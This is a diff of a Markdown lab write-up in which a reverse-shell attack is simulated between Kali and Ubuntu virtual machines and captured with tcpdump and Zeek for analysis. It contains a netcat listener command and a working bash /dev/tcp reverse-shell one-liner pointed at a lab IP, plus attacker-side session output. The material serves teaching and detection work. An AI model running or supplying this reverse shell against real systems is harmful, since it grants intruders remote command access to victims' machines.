@@ -543,19 +543,143 @@ This tells us:
 ### 🔁 3. Remote Shell Attack (Reverse Shell) using Netcat
 ##
 
-#### What is a Reverse Shell?
-A **reverse shell** is a connection initiated from the victim **back to the attacker**. This is useful for attackers because:
-- Many firewalls allow outbound connections but block inbound ones. 
-- The attacker sets up a "listener" and waits for the victim to connect.
+In the previous scenario, we simulated a **brute force attack against SSH**, which attempts to gain unauthorized access by repeatedly trying username/password combinations. While this approach is conceptually simple, and could work against poorly configured systems, **modern and well-configured systems are typically protected against such attacks** through mechanisms like:
+
+- **Fail2Ban** or similar tools that detect repeated failed login attempts and block the source IP. 
+
+- **Rate limiting**, **two-factor authentication**, and **strong password policies**.
+ 
+- **Logging and monitoring** tools that can alert administrators of suspicious login behavior.
+
+Because of these protections, brute force attacks have **low success rates** and are **easily detected**. A more **stealthy and realistic technique** to gain unauthorized remote access is the use of a **reverse shell**.
 
 ##
-#### 🎣 Why Would the Victim Iniciate the Connection?
-In a real-world attack, the attacker might:
 
-- Send a malicious script or attachment via phishing email
+#### What is Reverse Shell?
 
-- Trick the user into downloading a "game" or "update"
+A **reverse shell** is a technique where the **attacker gains remote access to a target machine** by making the **victim machine initiate an outbound connection back to the attacker**.
 
-- Exploit a vulnerability in a web server
+Unlike traditional remote access (like SSH), where the attacker connects directly to the victim, in a reverse shell the roles are reversed:
+
+- The **attacker sets up a listener** on their own machine (e.g., using `netcat`).
+
+- The **victim unknowingly runs a malicious command or script** (often hidden in a phishing email, fake installer, macro-enabled document, etc.).
+
+- That command **opens a shell session and connects back** to the attacker's listener. 
+
+- Once connected, the attacker can execute commands on the victim's machine **as if they were physically present**.
+
+##
+#### 🎣 Why Would the Victim Initiate the Connection?
+
+Of course, a system wouldn't initiate a reverse shell **intentionally**. The attacker typically relies on **social engineering** or **exploits** to **trick the user or system** into executing a malicious command.
 
 In our case, we simulate this by manually running the reverse shell on the victim.
+
+These commands are **often embedded in malicious files, scripts, or payloads**, and once triggered, **the victim’s system connects back to the attacker**, bypassing firewalls that might block inbound connections.
+
+This makes reverse shells particularly effective, since:
+
+- **Outbound traffic is often less restricted** than inbound traffic.
+
+- It **avoids detection** by appearing as a legitimate outgoing connection.
+
+- It **grants full shell access**, allowing the attacker to explore, escalate privileges, or install persistence mechanisms.
+
+##
+
+### 👁️‍🗨️ Continue Monitoring on Ubuntu VM
+
+1. Run the commands listed above on Monitoring Setup.
+2. We´ll name the file `tcpdump` is going to write on: `reverse_shell.pcap`.
+
+##
+### ⚔️ Performing the Attack:
+
+To simulate a reverse shell, we'll use **Netcat** (`nc`), a powerful networking tool available by default in Kali Linux and most Unix-like systems. 
+
+#### Attacker (Kali) - Set up a listener 
+
+On the **attacker’s machine (Kali)**, we open a listener on port `4444`, waiting for incoming connections:
+```
+nc -lvnp 4444
+```
+
+**Explanation:**
+- `-l`: Listen mode (wait for incoming connections).
+- `-v`: Verbose output (shows connection info).
+- `-n`: Do not resolve hostnames (faster, avoids DNS lookup).
+- `-p 4444`: Specify the port number to listen on (4444 in this case).
+
+#### Victim (Ubuntu) - Trigger the reverse shell 
+
+On the **victim machine (Ubuntu)**, the following command is executed (simulating a malicious script or phishing attack):
+```
+bash -i >& /dev/tcp/10.0.1.4/4444 0>&1
+```
+**Explanation:**
+
+- `bash -i`: Starts an interactive bash shell.
+
+- `>& /dev/tcp/10.0.1.4/4444`: Redirects input and output to a TCP connection with the attacker’s IP (`10.0.1.4`) and port `4444`. 
+
+- `0>&1`: Redirects standard input to the same as standard output — completing the shell redirection.
+
+##
+
+### 🔁 Reverse Shell: Attack Analysis
+
+Once the reverse shell connection is successfully established, the attacker gains direct command-line access to the victim’s machine. Below is a breakdown of what this looks like in practice:
+
+### Attacker's Perspective:
+```
+┌──(azureuser㉿kali)-[~]
+└─$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.0.1.5 42476
+
+azureuser@ubuntu-vm:~$
+```
+- A connection is received from the victim's machine (`10.0.1.5`), indicating that the reverse shell has been initiated.
+
+- The prompt `azureuser@ubuntu-vm:~$` confirms that the attacker now has an **interactive shell on the victim's system**.
+
+_A screenshot is included below to provide a visual reference of this interaction:_
+
+![Reverse Shell Connection Established](images/kali_reverse_shell1.png)
+
+
+- This output confirms a **successful compromise**. The attacker now has **remote access to the victim’s system**, with the ability to execute commands as if they were sitting at the machine. This level of access poses a **severe security risk** — allowing the attacker to explore the file system, exfiltrate data, install malware, or escalate privileges.
+
+
+#### Example Command: Identifying the System 
+
+One of the first things an attacker might do is gather system information:
+```
+uname -a
+```
+
+- This command returns details about the operating system, kernel version, and architecture.
+
+- The information helps the attacker **tailor further exploits** or identify known vulnerabilities for that specific system.
+
+ _An example output is shown below for reference:_
+
+ ![Uname -a Output](images/uname_output.png)
+
+
+### Victims's Perspective:
+
+On the victim’s machine, once the reverse shell command is executed, the terminal appears to freeze or become unresponsive:
+
+
+##
+### 📊 Results and Analysis After a Reverse Shell
+
+- Stop Zeek and tcpdump using Ctrl + C once the attack completes.
+
+### Attacker's Perspective:
+
+### Victims's Perspective:
+
+
